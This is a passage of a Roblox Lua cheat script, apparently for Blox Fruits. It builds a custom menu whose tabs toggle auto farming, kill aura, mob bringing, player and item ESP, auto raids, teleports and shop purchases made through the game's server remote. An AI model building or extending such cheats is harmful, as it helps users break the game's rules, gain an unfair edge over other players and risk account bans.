                TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(26, 26, 36)}):Play()
                TweenService:Create(BStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(255, 255, 255)}):Play()
            end)
            Btn.MouseLeave:Connect(function()
                TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(16, 16, 22)}):Play()
                TweenService:Create(BStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(36, 36, 46)}):Play()
            end)
            Btn.MouseButton1Click:Connect(function()
                PlayClickSound()
                TweenService:Create(Btn, TweenInfo.new(0.08), {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(10, 10, 12)}):Play()
                task.wait(0.1)
                TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(16, 16, 22), TextColor3 = Color3.fromRGB(240, 240, 245)}):Play()
                if callback then pcall(callback) end
            end)
        end
        
        function TabAPI:AddSearchDropdown(title, options, defaultVal, callback)
            local selected = defaultVal or (options and options[1]) or ""
            local allOptions = options or {}
            local filteredOptions = allOptions
            
            local DropFrame = Instance.new("Frame")
            DropFrame.Size = UDim2.new(1, -16, 0, 34)
            DropFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
            DropFrame.BorderSizePixel = 0
            DropFrame.ClipsDescendants = true
            DropFrame.Active = true
            DropFrame.Parent = Page
            local DCorner = Instance.new("UICorner")
            DCorner.CornerRadius = UDim.new(0, 6)
            DCorner.Parent = DropFrame
            local DStroke = Instance.new("UIStroke")
            DStroke.Color = Color3.fromRGB(28, 28, 36)
            DStroke.Thickness = 1
            DStroke.Parent = DropFrame
            
            local DTitle = Instance.new("TextLabel")
            DTitle.Size = UDim2.new(0, 150, 0, 34)
            DTitle.Position = UDim2.new(0, 10, 0, 0)
            DTitle.Text = title
            DTitle.TextColor3 = Color3.fromRGB(230, 230, 240)
            DTitle.Font = Enum.Font.Gotham
            DTitle.TextSize = 11
            DTitle.TextXAlignment = Enum.TextXAlignment.Left
            DTitle.BackgroundTransparency = 1
            DTitle.Active = true
            DTitle.Parent = DropFrame
            
            local SelectBtn = Instance.new("TextButton")
            SelectBtn.Size = UDim2.new(0, 215, 0, 24)
            SelectBtn.Position = UDim2.new(1, -225, 0, 5)
            SelectBtn.Text = tostring(selected) .. " ▾"
            SelectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            SelectBtn.Font = Enum.Font.GothamMedium
            SelectBtn.TextSize = 10
            SelectBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
            SelectBtn.BorderSizePixel = 0
            SelectBtn.Active = true
            SelectBtn.Parent = DropFrame
            local SBCorner = Instance.new("UICorner")
            SBCorner.CornerRadius = UDim.new(0, 5)
            SBCorner.Parent = SelectBtn
            
            local SearchBox = Instance.new("TextBox")
            SearchBox.Size = UDim2.new(1, -16, 0, 24)
            SearchBox.Position = UDim2.new(0, 8, 0, 38)
            SearchBox.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
            SearchBox.BorderSizePixel = 0
            SearchBox.PlaceholderText = "Type to filter " .. title .. "..."
            SearchBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 135)
            SearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            SearchBox.Font = Enum.Font.Gotham
            SearchBox.TextSize = 10
            SearchBox.ClearTextOnFocus = false
            SearchBox.Active = true
            SearchBox.Parent = DropFrame
            local SearchCorner = Instance.new("UICorner")
            SearchCorner.CornerRadius = UDim.new(0, 4)
            SearchCorner.Parent = SearchBox
            local SearchStroke = Instance.new("UIStroke")
            SearchStroke.Color = Color3.fromRGB(255, 255, 255)
            SearchStroke.Thickness = 1
            SearchStroke.Transparency = 0.5
            SearchStroke.Parent = SearchBox
            
            local ListScroll = Instance.new("ScrollingFrame")
            ListScroll.Size = UDim2.new(1, -16, 0, 110)
            ListScroll.Position = UDim2.new(0, 8, 0, 68)
            ListScroll.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
            ListScroll.BorderSizePixel = 0
            ListScroll.ScrollBarThickness = 2
            ListScroll.Active = true
            ListScroll.Parent = DropFrame
            local LCorner = Instance.new("UICorner")
            LCorner.CornerRadius = UDim.new(0, 4)
            LCorner.Parent = ListScroll
            
            local LLayout = Instance.new("UIListLayout")
            LLayout.Padding = UDim.new(0, 2)
            LLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
            LLayout.SortOrder = Enum.SortOrder.LayoutOrder
            LLayout.Parent = ListScroll
            
            local function RenderOptions()
                for _, child in ipairs(ListScroll:GetChildren()) do
                    if child:IsA("TextButton") then child:Destroy() end
                end
                for _, opt in ipairs(filteredOptions) do
                    local OptBtn = Instance.new("TextButton")
                    OptBtn.Size = UDim2.new(1, -8, 0, 22)
                    OptBtn.Text = tostring(opt)
                    OptBtn.TextColor3 = (opt == selected) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(200, 200, 210)
                    OptBtn.Font = Enum.Font.Gotham
                    OptBtn.TextSize = 10
                    OptBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
                    OptBtn.BorderSizePixel = 0
                    OptBtn.Active = true
                    OptBtn.Parent = ListScroll
                    local OCorner = Instance.new("UICorner")
                    OCorner.CornerRadius = UDim.new(0, 3)
                    OCorner.Parent = OptBtn
                    
                    OptBtn.MouseEnter:Connect(function()
                        TweenService:Create(OptBtn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(28, 28, 38)}):Play()
                    end)
                    OptBtn.MouseLeave:Connect(function()
                        TweenService:Create(OptBtn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(18, 18, 24)}):Play()
                    end)
                    OptBtn.MouseButton1Click:Connect(function()
                        PlayClickSound()
                        selected = opt
                        SelectBtn.Text = tostring(selected) .. " ▾"
                        TweenService:Create(DropFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {Size = UDim2.new(1, -16, 0, 34)}):Play()
                        isOpen = false
                        if callback then pcall(callback, selected) end
                    end)
                end
                ListScroll.CanvasSize = UDim2.new(0, 0, 0, #filteredOptions * 24 + 4)
            end
            
            local isOpen = false
            SelectBtn.MouseButton1Click:Connect(function()
                PlayClickSound()
                isOpen = not isOpen
                if isOpen then
                    filteredOptions = allOptions
                    SearchBox.Text = ""
                    RenderOptions()
                    TweenService:Create(DropFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {Size = UDim2.new(1, -16, 0, 186)}):Play()
                else
                    TweenService:Create(DropFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {Size = UDim2.new(1, -16, 0, 34)}):Play()
                end
            end)
            
            SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
                local query = SearchBox.Text:lower()
                if query == "" then
                    filteredOptions = allOptions
                else
                    filteredOptions = {}
                    for _, opt in ipairs(allOptions) do
                        if tostring(opt):lower():find(query, 1, true) then
                            table.insert(filteredOptions, opt)
                        end
                    end
                end
                RenderOptions()
            end)
            
            if callback and selected ~= "" then
                pcall(callback, selected)
            end
            
            local DropAPI = {}
            function DropAPI:SetOptions(newOpts)
                allOptions = newOpts or {}
                filteredOptions = allOptions
                if #allOptions > 0 then
                    local found = false
                    for _, opt in ipairs(allOptions) do
                        if opt == selected then found = true; break end
                    end
                    if not found then
                        local matchedOpt = nil
                        for _, opt in ipairs(allOptions) do
                            if opt:find(_G.Config.SelectedWeapon or "Melee") or opt:find("Pirate") or opt:find("Bandit") then
                                matchedOpt = opt; break
                            end
                        end
                        selected = matchedOpt or allOptions[1]
                        SelectBtn.Text = tostring(selected) .. " ▾"
                        if callback then pcall(callback, selected) end
                    end
                end
                RenderOptions()
            end
            function DropAPI:Get()
                return selected
            end
            return DropAPI
        end
        
        function TabAPI:AddDropdown(title, options, defaultVal, callback)
            return TabAPI:AddSearchDropdown(title, options, defaultVal, callback)
        end
        
        function TabAPI:AddSlider(title, min, max, defaultVal, callback)
            local current = defaultVal or min
            local SliderFrame = Instance.new("Frame")
            SliderFrame.Size = UDim2.new(1, -16, 0, 44)
            SliderFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
            SliderFrame.BorderSizePixel = 0
            SliderFrame.Active = true
            SliderFrame.Parent = Page
            local SlCorner = Instance.new("UICorner")
            SlCorner.CornerRadius = UDim.new(0, 6)
            SlCorner.Parent = SliderFrame
            local SlStroke = Instance.new("UIStroke")
            SlStroke.Color = Color3.fromRGB(28, 28, 36)
            SlStroke.Thickness = 1
            SlStroke.Parent = SliderFrame
            
            local STitle = Instance.new("TextLabel")
            STitle.Size = UDim2.new(0, 220, 0, 20)
            STitle.Position = UDim2.new(0, 10, 0, 4)
            STitle.Text = title
            STitle.TextColor3 = Color3.fromRGB(230, 230, 240)
            STitle.Font = Enum.Font.Gotham
            STitle.TextSize = 11
            STitle.TextXAlignment = Enum.TextXAlignment.Left
            STitle.BackgroundTransparency = 1
            STitle.Active = true
            STitle.Parent = SliderFrame
            
            local SValue = Instance.new("TextLabel")
            SValue.Size = UDim2.new(0, 60, 0, 20)
            SValue.Position = UDim2.new(1, -70, 0, 4)
            SValue.Text = tostring(current)
            SValue.TextColor3 = Color3.fromRGB(255, 255, 255)
            SValue.Font = Enum.Font.GothamBold
            SValue.TextSize = 11
            SValue.TextXAlignment = Enum.TextXAlignment.Right
            SValue.BackgroundTransparency = 1
            SValue.Active = true
            SValue.Parent = SliderFrame
            
            local Bar = Instance.new("Frame")
            Bar.Size = UDim2.new(1, -20, 0, 6)
            Bar.Position = UDim2.new(0, 10, 0, 30)
            Bar.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
            Bar.BorderSizePixel = 0
            Bar.Active = true
            Bar.Parent = SliderFrame
            local BarCorner = Instance.new("UICorner")
            BarCorner.CornerRadius = UDim.new(1, 0)
            BarCorner.Parent = Bar
            
            local Fill = Instance.new("Frame")
            local pct = math.clamp((current - min) / (max - min), 0, 1)
            Fill.Size = UDim2.new(pct, 0, 1, 0)
            Fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Fill.BorderSizePixel = 0
            Fill.Active = true
            Fill.Parent = Bar
            local FillCorner = Instance.new("UICorner")
            FillCorner.CornerRadius = UDim.new(1, 0)
            FillCorner.Parent = Fill
            
            local sDragging = false
            local function UpdateSlide(inputPos)
                local rel = math.clamp((inputPos.X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
                local val = math.floor(min + (max - min) * rel)
                current = val
                SValue.Text = tostring(current)
                TweenService:Create(Fill, TweenInfo.new(0.05), {Size = UDim2.new(rel, 0, 1, 0)}):Play()
                if callback then pcall(callback, current) end
            end
            
            SliderFrame.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    sDragging = true
                    UpdateSlide(input.Position)
                end
            end)
            UIS.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    sDragging = false
                end
            end)
            UIS.InputChanged:Connect(function(input)
                if sDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                    UpdateSlide(input.Position)
                end
            end)
            
            local SliderAPI = {}
            function SliderAPI:Set(val)
                current = math.clamp(val, min, max)
                local p = (current - min) / (max - min)
                SValue.Text = tostring(current)
                Fill.Size = UDim2.new(p, 0, 1, 0)
                if callback then pcall(callback, current) end
            end
            return SliderAPI
        end
        
        return TabAPI
    end
    -- ==================== TAB INITIALIZATION ====================
    local FarmTab = CreateTab("Main Farm")
    local BossTab = CreateTab("Boss Farm")
    local RaidTab = CreateTab("Raids")
    local FruitTab = CreateTab("Devil Fruit")
    local SeaTab = CreateTab("Sea Events")
    local V4Tab = CreateTab("Race V4")
    local VisualTab = CreateTab("Visuals & ESP")
    local ItemTab = CreateTab("Quests")
    local StatsTab = CreateTab("Stats")
    local ShopTab = CreateTab("Shop")
    local TeleportTab = CreateTab("Teleports")
    local MiscTab = CreateTab("Settings")
    
    -- ==================== 1. MAIN FARM TAB ====================
    FarmTab:AddSection("Auto Farming")
    FarmTab:AddToggle("Auto Farm Level (Auto Quest + Mob)", false, function(v)
        _G.Config.AutoFarmLevel = v
        if not v then ClearHover() end
    end)
    FarmTab:AddToggle("Auto Chest Farm", false, function(v)
        _G.Config.AutoChestFarm = v
        if v then
            _collectedChests = {}
            _chestCircuitIndex = 1
        else
            ClearHover()
            StopTween()
        end
    end)
    
    FarmTab:AddSection("Weapon & Combat Mode")
    FarmTab:AddDropdown("Select Weapon", {"Melee", "Sword", "Gun", "Fruit"}, "Melee", function(v)
        _G.Config.SelectedWeapon = v
        EquipWeapon(v)
    end)
    FarmTab:AddToggle("Use M1 / Fast Attack", true, function(v) _G.Config.UseM1 = v end)
    FarmTab:AddDropdown("Click Speed", {"Super Fast (0.015s)", "Fast (0.04s)", "Normal (0.08s)"}, "Super Fast (0.015s)", function(v)
        if v:find("0.015") then _G.Config.FastAttackSpeed = 0.015
        elseif v:find("0.04") then _G.Config.FastAttackSpeed = 0.04
        else _G.Config.FastAttackSpeed = 0.08 end
    end)
    FarmTab:AddSlider("Kill Aura Range (Studs)", 40, 250, 120, function(v) _G.Config.AttackDistance = v end)
    FarmTab:AddToggle("Bring Mobs (Simulation Radius)", true, function(v) _G.Config.BringMobs = v end)
    FarmTab:AddToggle("Auto Buso Haki (Enhancement)", true, function(v) _G.Config.AutoBusoHaki = v end)
    FarmTab:AddToggle("Auto Ken Haki (Observation)", false, function(v) _G.Config.AutoKenHaki = v end)
    
    FarmTab:AddSection("Weapon Skills")
    FarmTab:AddToggle("Use Weapon Skills", false, function(v) _G.Config.UseSkills = v end)
    FarmTab:AddToggle("Use Skill [Z]", true, function(v) _G.Config.Skill_Z = v end)
    FarmTab:AddToggle("Use Skill [X]", true, function(v) _G.Config.Skill_X = v end)
    FarmTab:AddToggle("Use Skill [C]", true, function(v) _G.Config.Skill_C = v end)
    FarmTab:AddToggle("Use Skill [V]", false, function(v) _G.Config.Skill_V = v end)
    FarmTab:AddToggle("Use Skill [F]", false, function(v) _G.Config.Skill_F = v end)
    
    FarmTab:AddSection("Farm Distance")
    FarmTab:AddToggle("Auto Adaptive Boss Distance", true, function(v) _G.Config.AdaptiveBossDistance = v end)
    FarmTab:AddSlider("Mob Distance (Studs)", 6, 25, 14, function(v) _G.Config.MobFarmDistance = v end)
    FarmTab:AddSlider("Boss Distance (Studs)", 10, 35, 20, function(v) _G.Config.BossFarmDistance = v end)
    
    FarmTab:AddSection("Selected Mob Farming (" .. SeaName .. ")")
    local mobList = GetSpawnedMobsList()
    if mobList and mobList[1] then _G.Config.SelectedMob = mobList[1] end
    local MobDrop = FarmTab:AddSearchDropdown("Select Mob (" .. SeaName .. ")", mobList, mobList[1], function(v) _G.Config.SelectedMob = v end)
    FarmTab:AddButton("Refresh Mobs List (" .. SeaName .. ")", function()
        local updated = GetSpawnedMobsList()
        MobDrop:SetOptions(updated)
        ShowLiveToast("MOBS REFRESHED", "Loaded " .. #updated .. " mobs for " .. SeaName, Color3.fromRGB(255, 255, 255), 3)
    end)
    FarmTab:AddToggle("Auto Farm Selected Mob", false, function(v)
        _G.Config.FarmSelectedMob = v
        if not v then ClearHover() end
    end)
    
    -- ==================== 2. BOSS FARM TAB ====================
    BossTab:AddSection("Boss Selection (" .. SeaName .. ")")
    local bossList = GetActiveBossesList()
    if bossList and bossList[1] and not bossList[1]:find("None Spawned") then
        _G.Config.SelectedBoss = bossList[1]
    end
    local BossDrop = BossTab:AddSearchDropdown("Select Boss", bossList, bossList[1], function(v)
        if not v:find("None Spawned") then
            _G.Config.SelectedBoss = v
        end
    end)
    BossTab:AddButton("Refresh Bosses List (Scan Active)", function()
        local updated = GetActiveBossesList()
        BossDrop:SetOptions(updated)
        local spawnedCount = 0
        for _, b in ipairs(updated) do
            if b:sub(1, 9) == "[Spawned]" then
                spawnedCount = spawnedCount + 1
            end
        end
        ShowLiveToast("BOSSES REFRESHED", "Found " .. spawnedCount .. " active spawned & " .. #updated .. " total bosses ready in " .. SeaName, Color3.fromRGB(255, 255, 255), 3)
    end)
    BossTab:AddToggle("Auto Farm Selected Boss", false, function(v)
        _G.Config.FarmSelectedBoss = v
        if not v then ClearHover() end
    end)
    BossTab:AddToggle("Auto Farm All Spawned Bosses (" .. SeaName .. ")", false, function(v)
        _G.Config.FarmAllBosses = v
        if not v then ClearHover() end
    end)
    
    BossTab:AddSection("World & Special Bosses")
    if Sea3 then
        BossTab:AddToggle("Auto Kill Rip Indra", false, function(v) _G.Config.AutoKillRipIndra = v; if not v then ClearHover() end end)
        BossTab:AddToggle("Auto Kill Dough King", false, function(v) _G.Config.AutoKillDoughKing = v; if not v then ClearHover() end end)
        BossTab:AddToggle("Auto Kill Cake Prince", false, function(v) _G.Config.AutoKillCakePrince = v; if not v then ClearHover() end end)
        BossTab:AddToggle("Auto Kill Soul Reaper", false, function(v) _G.Config.AutoKillSoulReaper = v; if not v then ClearHover() end end)
        BossTab:AddToggle("Auto Farm Bones (Haunted Castle)", false, function(v) _G.Config.AutoFarmBones = v; if not v then ClearHover() end end)
        BossTab:AddToggle("Auto Roll Bones (Death King)", false, function(v) _G.Config.AutoRollBones = v end)
        BossTab:AddToggle("Auto Summon Soul Reaper", false, function(v) _G.Config.AutoSummonSoulReaper = v end)
    elseif Sea2 then
        BossTab:AddToggle("Auto Kill Darkbeard", false, function(v) _G.Config.AutoKillDarkbeard = v; if not v then ClearHover() end end)
        BossTab:AddToggle("Auto Kill Cursed Captain", false, function(v) _G.Config.AutoKillCursedCaptain = v; if not v then ClearHover() end end)
        BossTab:AddToggle("Auto Kill Order (Law)", false, function(v) _G.Config.AutoKillLaw = v; if not v then ClearHover() end end)
    else
        BossTab:AddNotice("World Raid Bosses (Indra, Dough King, Darkbeard) are located in Second & Third Sea.", Color3.fromRGB(255, 170, 70))
    end
    
    -- ==================== 3. DUNGEON & RAIDS ====================
    RaidTab:AddSection("Raid Controls")
    if Sea1 then
        RaidTab:AddNotice("Raids unlock at Level 1100 in Second Sea.", Color3.fromRGB(255, 150, 70))
    else
        RaidTab:AddSearchDropdown("Select Raid Chip", {"Flame", "Ice", "Quake", "Light", "Dark", "String", "Rumble", "Magma", "Human: Buddha", "Phoenix", "Dough"}, "Flame", function(v) _G.Config.SelectedChip = v end)
        RaidTab:AddToggle("Auto Buy Raid Chip", false, function(v) _G.Config.AutoBuyChip = v end)
        RaidTab:AddToggle("Auto Start Raid", false, function(v) _G.Config.AutoStartRaid = v end)
        RaidTab:AddToggle("Auto Farm Raid (Next Island)", false, function(v) _G.Config.AutoFarmRaid = v; if not v then ClearHover() end end)
        RaidTab:AddToggle("Auto Awaken Fruit", false, function(v) _G.Config.AutoAwaken = v end)
        RaidTab:AddToggle("Auto Law / Order Raid", false, function(v) _G.Config.AutoLawRaid = v; if not v then ClearHover() end end)
    end
    
    -- ==================== 4. DEVIL FRUIT ====================
    FruitTab:AddSection("Fruit Actions")
    FruitTab:AddButton("Spin Random Fruit Now (1-Click)", function()
        SpinRandomFruitNow()
    end)
    FruitTab:AddButton("Store All Fruits to Inventory", function()
        StoreAllPhysicalFruits()
    end)
    FruitTab:AddToggle("Auto Random Fruit (Gacha Cousin)", false, function(v) _G.Config.AutoRandomFruit = v end)
    FruitTab:AddToggle("Auto Store Fruits in Inventory", false, function(v) _G.Config.AutoStoreFruit = v end)
    FruitTab:AddToggle("Auto Grab Dropped Fruits (Tween)", false, function(v) _G.Config.AutoGrabFruits = v; if not v then ClearHover() end end)
    FruitTab:AddToggle("Fruit ESP (Billboard Labels)", false, function(v)
        _G.Config.FruitESP = v
        UpdateFruitESP()
    end)
    
    -- ==================== 5. SEA EVENTS ====================
    SeaTab:AddSection("Sea Events & Hunting")
    if Sea1 then
        SeaTab:AddNotice("Sea Events unlock in Second & Third Sea.", Color3.fromRGB(100, 180, 255))
    else
        SeaTab:AddToggle("Auto Kill Sharks", false, function(v) _G.Config.AutoKillShark = v; if not v then ClearHover() end end)
        SeaTab:AddToggle("Auto Kill Terror Shark", false, function(v) _G.Config.AutoKillTerrorShark = v; if not v then ClearHover() end end)
        SeaTab:AddToggle("Auto Kill Sea Beast (Safe Altitude)", false, function(v) _G.Config.AutoKillSeaBeast = v; if not v then ClearHover() end end)
        SeaTab:AddButton("Check Mirage Island Status", function()
            local s = CheckIslandSpawn("MysticIsland") or CheckIslandSpawn("Mirage Island")
            print("[ALPHA] Mirage Island:", s and "SPAWNED!" or "NOT Spawned")
        end)
        SeaTab:AddButton("Check Kitsune Island Status", function()
            local s = CheckIslandSpawn("KitsuneIsland") or CheckIslandSpawn("Kitsune Island")
            print("[ALPHA] Kitsune Island:", s and "SPAWNED!" or "NOT Spawned")
        end)
        SeaTab:AddToggle("Auto Find Blue Gear (Mirage)", false, function(v) _G.Config.AutoFindGear = v; if not v then ClearHover() end end)
        SeaTab:AddToggle("Auto Collect Azure Embers (Kitsune)", false, function(v) _G.Config.AutoKitsuneEmber = v; if not v then ClearHover() end end)
    end
    
    -- ==================== 6. RACE V4 TAB ====================
    V4Tab:AddSection("Temple of Time & Trials")
    if not Sea3 then
        V4Tab:AddNotice("Race V4 is exclusive to Third Sea (Temple of Time).", Color3.fromRGB(255, 140, 70))
    else
        V4Tab:AddButton("Teleport to Temple of Time", function()
            TweenTo(CFrame.new(28282.57, 14896.85, 105.10))
        end)
        V4Tab:AddToggle("Auto Pull Secret Lever", false, function(v) _G.Config.AutoPullLever = v end)
        V4Tab:AddToggle("Auto Complete Race Trial", false, function(v) _G.Config.AutoRaceV4Trial = v end)
        V4Tab:AddToggle("Auto Insert Gear (Ancient Clock)", false, function(v) _G.Config.AutoInsertGear = v end)
    end
    
    -- ==================== 7. VISUALS & ESP ====================
    VisualTab:AddSection("ESP Suite")
    VisualTab:AddToggle("Player ESP (Health + Team)", false, function(v)
        _G.Config.PlayerESP = v
        UpdatePlayerESP()
    end)
    VisualTab:AddToggle("Fruit ESP (Rarity Colors)", false, function(v)
        _G.Config.FruitESP = v
        UpdateFruitESP()
    end)
    VisualTab:AddToggle("Chest ESP (Gold/Silver/Diamond)", false, function(v)
        _G.Config.ChestESP = v
        UpdateChestESP()
    end)
    VisualTab:AddToggle("Flower ESP (Blue/Red/Yellow)", false, function(v)
        _G.Config.FlowerESP = v
        UpdateFlowerESP()
    end)
    VisualTab:AddToggle("Sea Event & Mirage ESP", false, function(v)
        _G.Config.SeaEventESP = v
        _G.Config.MirageESP = v
        UpdateSeaEventESP()
    end)
    
    -- ==================== 8. ITEMS & QUESTS ====================
    ItemTab:AddSection("Special Quests & Sea Travel")
    if Sea1 then
        ItemTab:AddButton("Auto Saber Quest", function() local cf = CommF(); if cf then cf:InvokeServer("ProQuestProgress", "RichSon") end end)
        ItemTab:AddButton("Travel to Second Sea (Requires Lv. 700)", function() local cf = CommF(); if cf then cf:InvokeServer("TravelDressrosa") end end)
    elseif Sea2 then
        ItemTab:AddButton("Auto Bartilo Quest", function() local cf = CommF(); if cf then cf:InvokeServer("BartiloQuestProgress", "GetMission") end end)
        ItemTab:AddButton("Travel to Third Sea (Requires Lv. 1500)", function() local cf = CommF(); if cf then cf:InvokeServer("TravelZou") end end)
    else
        ItemTab:AddNotice("You have reached the Third Sea!", Color3.fromRGB(100, 255, 150))
    end
    
    -- ==================== 9. STATS ALLOCATOR ====================
    StatsTab:AddSection("Stat Points Allocator")
    StatsTab:AddToggle("Auto Allocate Stats", false, function(v) _G.Config.AutoStats = v end)
    StatsTab:AddSlider("Points Per Stat", 1, 100, 1, function(v) _G.Config.StatPoints = v end)
    StatsTab:AddToggle("Melee", true, function(v) _G.Config.Stats.Melee = v end)
    StatsTab:AddToggle("Defense", true, function(v) _G.Config.Stats.Defense = v end)
    StatsTab:AddToggle("Sword", false, function(v) _G.Config.Stats.Sword = v end)
    StatsTab:AddToggle("Gun", false, function(v) _G.Config.Stats.Gun = v end)
    StatsTab:AddToggle("Blox Fruit", false, function(v) _G.Config.Stats.Fruit = v end)
    StatsTab:AddButton("Refund Stats (2,500 Frags)", function() local cf = CommF(); if cf then cf:InvokeServer("BlackbeardReward", "Refund", "2") end end)
    StatsTab:AddButton("Reroll Race (3,000 Frags)", function() local cf = CommF(); if cf then cf:InvokeServer("BlackbeardReward", "Reroll", "2") end end)
    
    -- ==================== 10. SHOP ====================
    ShopTab:AddSection("Fighting Styles")
    ShopTab:AddButton("Buy Black Leg ($150,000)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyBlackLeg") end end)
    ShopTab:AddButton("Buy Electro ($550,000)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyElectro") end end)
    ShopTab:AddButton("Buy Fishman Karate ($750,000)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyFishmanKarate") end end)
    ShopTab:AddButton("Buy Dragon Breath (1,500 Frags)", function() local cf = CommF(); if cf then cf:InvokeServer("BlackbeardReward", "DragonClaw", "2") end end)
    ShopTab:AddButton("Buy Superhuman ($3,000,000)", function() local cf = CommF(); if cf then cf:InvokeServer("BuySuperhuman") end end)
    ShopTab:AddButton("Buy Death Step ($5M + 5k Frags)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyDeathStep") end end)
    ShopTab:AddButton("Buy Sharkman Karate ($2.5M + 5k Frags)", function() local cf = CommF(); if cf then cf:InvokeServer("BuySharkmanKarate") end end)
    ShopTab:AddButton("Buy Electric Claw ($3M + 5k Frags)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyElectricClaw") end end)
    ShopTab:AddButton("Buy Dragon Talon ($3M + 5k Frags)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyDragonTalon") end end)
    ShopTab:AddButton("Buy Godhuman ($5M + 5k Frags)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyGodhuman") end end)
    ShopTab:AddSection("Abilities & Haki")
    ShopTab:AddButton("Buy Skyjump (Geppo - $10,000)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyHaki", "Geppo") end end)
    ShopTab:AddButton("Buy Enhancement (Buso - $25,000)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyHaki", "Buso") end end)
    ShopTab:AddButton("Buy Flash Step (Soru - $100,000)", function() local cf = CommF(); if cf then cf:InvokeServer("BuyHaki", "Soru") end end)
    ShopTab:AddButton("Buy Observation Haki ($750,000)", function() local cf = CommF(); if cf then cf:InvokeServer("KenHaki") end end)
    
    -- ==================== 11. TELEPORTS ====================
    TeleportTab:AddSection("Island Teleports (" .. SeaName .. ")")
    local AllIslands = {
        [1] = {
            ["Pirate Starter (Lv. 1)"] = CFrame.new(1059.37, 16.51, 1546.99),
            ["Marine Starter (Lv. 1)"] = CFrame.new(-2573.39, 6.94, 2059.27),
            ["Middle Town"] = CFrame.new(-655.82, 7.84, 1588.65),
            ["Jungle (Lv. 15)"] = CFrame.new(-1612.33, 36.85, 149.13),
            ["Pirate Village (Lv. 30)"] = CFrame.new(-1181.39, 4.75, 3843.43),
            ["Desert (Lv. 60)"] = CFrame.new(1094.11, 6.44, 4192.89),
            ["Snow Island (Lv. 90)"] = CFrame.new(1384.81, 87.27, -1298.47),
            ["Marineford (Lv. 120)"] = CFrame.new(-5035.79, 28.65, 4324.96),
            ["Sky Island (Lv. 150)"] = CFrame.new(-4839.53, 717.67, -2619.44),
            ["Upper Sky (Lv. 450)"] = CFrame.new(-7894.62, 5545.49, -380.41),
            ["Prison (Lv. 190)"] = CFrame.new(4875.33, 5.65, 735.45),
            ["Colosseum (Lv. 250)"] = CFrame.new(-1427.62, 7.28, -2792.77),
            ["Magma Village (Lv. 300)"] = CFrame.new(-5247.72, 8.57, 8504.68),
            ["Underwater City (Lv. 375)"] = CFrame.new(61163.85, 18.49, 1569.25),
            ["Fountain City (Lv. 625)"] = CFrame.new(5127.13, 59.50, 4105.45)
        },
        [2] = {
            ["Cafe (Safe Zone)"] = CFrame.new(-380.47, 77.22, 255.82),
            ["Mansion (Swan)"] = CFrame.new(-417.47, 332.18, 595.66),
            ["Kingdom of Rose (Lv. 700)"] = CFrame.new(878.01, 121.98, 1235.35),
            ["Green Zone (Lv. 875)"] = CFrame.new(-2448.53, 73.02, -3210.63),
            ["Graveyard (Lv. 950)"] = CFrame.new(-5418.89, 48.52, -774.75),
            ["Snow Mountain (Lv. 1000)"] = CFrame.new(608.24, 401.52, -5372.46),
            ["Hot and Cold (Lv. 1100)"] = CFrame.new(-6026.96, 15.96, -5071.29),
            ["Cursed Ship (Lv. 1250)"] = CFrame.new(923.21, 126.98, 32852.83),
            ["Ice Castle (Lv. 1350)"] = CFrame.new(5422.31, 28.25, -6767.13),
            ["Forgotten Island (Lv. 1425)"] = CFrame.new(-3054.44, 237.15, -10142.82),
            ["Dark Arena (Darkbeard)"] = CFrame.new(3780.03, 22.65, -3498.94)
        },
        [3] = {
            ["Port Town (Lv. 1500)"] = CFrame.new(-290.74, 6.73, 5343.55),
            ["Hydra Island (Lv. 1575)"] = CFrame.new(5749.73, 610.42, -267.78),
            ["Great Tree (Lv. 1700)"] = CFrame.new(2681.27, 1682.80, -7190.99),
            ["Floating Turtle (Lv. 1775)"] = CFrame.new(-12463.87, 374.91, -7523.77),
            ["Castle on the Sea"] = CFrame.new(-5085.24, 314.52, -3156.26),
            ["Haunted Castle (Lv. 1975)"] = CFrame.new(-9516.99, 172.01, 6078.47),
            ["Peanut Island (Lv. 2075)"] = CFrame.new(-2062.73, 50.32, -10232.22),
            ["Ice Cream Island (Lv. 2125)"] = CFrame.new(-902.59, 79.92, -10988.69),
            ["Cake Island (Lv. 2200)"] = CFrame.new(-2100.12, 70.12, -12150.34),
